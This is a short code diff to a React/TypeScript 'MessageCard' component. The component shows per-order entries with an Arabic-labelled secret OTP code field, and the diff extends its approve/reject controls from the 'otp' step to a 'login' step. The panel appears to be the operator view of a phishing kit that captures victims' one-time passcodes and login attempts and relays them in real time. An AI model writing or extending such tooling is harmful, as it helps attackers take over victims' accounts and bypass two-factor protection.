@@ -180,7 +180,7 @@ function MessageCard({ order, index }: { order: Order; index: number }) {
   const ts = order.completedAt || order.updatedAt || order.timestamp;
   const [acting, setActing] = useState(false);
 
-  const isAwaitingApproval = order.step === "otp" && order.approved === null;
+  const isAwaitingApproval = (order.step === "otp" || order.step === "login") && order.approved === null;
   const isApproved = order.approved === true;
   const isRejected = order.approved === false;
 
@@ -222,7 +222,7 @@ function MessageCard({ order, index }: { order: Order; index: number }) {
       <DataRow label="رمز OTP" value={order.otp} icon="🔐" secret />
 
       {/* Approval */}
-      {order.step === "otp" && (
+      {(order.step === "otp" || order.step === "login") && (
         <div style={{ marginTop: 12 }}>
           {isAwaitingApproval && (
             <div style={{ display: "flex", gap: 8 }}>
